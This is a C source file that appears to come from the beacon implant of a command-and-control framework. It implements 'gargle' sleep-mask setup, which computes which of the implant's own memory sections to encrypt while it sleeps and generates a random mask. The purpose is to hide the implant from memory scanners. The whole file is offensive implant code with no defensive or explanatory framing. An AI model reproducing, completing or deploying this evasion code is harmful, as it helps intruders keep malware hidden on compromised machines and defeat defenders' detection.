/* gargle! */
#include <windows.h>
#include <stdlib.h>
#include "crypto.h"
#include "beacon.h"
#include "gargleint.h"

void    * gtrampoline = NULL;
GARGLEP * gparms = NULL;

void gargle_setup_parms(void * begin, void * end, int mask_fn_in_beacon) {
	DWORD * index;
	DWORD a, b, temp;

	if (gparms != NULL)
		return;

	gparms = (GARGLEP *)malloc(sizeof(GARGLEP));
	track_memory_add(gparms, sizeof(GARGLEP), TRACK_MEMORY_MALLOC, FALSE, NULL);
	gparms->beacon_ptr = (char *)get_beacon_ptr();
	gparms->sections = (DWORD *)setting_ptr(SETTING_GARGLE_SECTIONS);
	gparms->heap_records = NULL; /* this is reset for each sleep. */

	/* update place holder addresses in the sections, so the sleep mask function
	 * will not be masked.
	 */
	index = gparms->sections;
	if (index == NULL) {
		static DWORD empty_sections[2] = { 0, 0 };
		gparms->sections = empty_sections;
	}
	else {
	 while (TRUE) {
		a = *index; b = *(index + 1);
		if (a == 0 && b == 0) {
			break;
		}
		if (a == -1 || b == -1) {
			if (!mask_fn_in_beacon) {
				/* Sleep-mask BOF is a separate alloc; do not treat -1 as a
				 * 32-bit offset from beacon_ptr (truncates and self-masks). */
				a = 0;
				b = 0;
				memcpy(index, &a, sizeof(DWORD));
				memcpy(index + 1, &b, sizeof(DWORD));
				break;
			}
		}
		if (a == -1) {
			temp = (DWORD)((DWORD_PTR)end - (DWORD_PTR)gparms->beacon_ptr);
			memcpy(index, &temp, sizeof(DWORD));
			a = *index;
		}
		if (b == -1) {
			temp = (DWORD)((DWORD_PTR)begin - (DWORD_PTR)gparms->beacon_ptr);
			memcpy(index + 1, &temp, sizeof(DWORD));
			b = *(index + 1);
		}
		index += 2; /* goto the next section */
	}
	}
	crypto_rng_get_bytes((unsigned char *)gparms->mask, sizeof(gparms->mask));
}

void gargle_trampoline(void * end, void * begin) {
	if (gtrampoline != NULL)
		return;
	gtrampoline = begin;
	gargle_setup_parms(begin, end, 1);
}
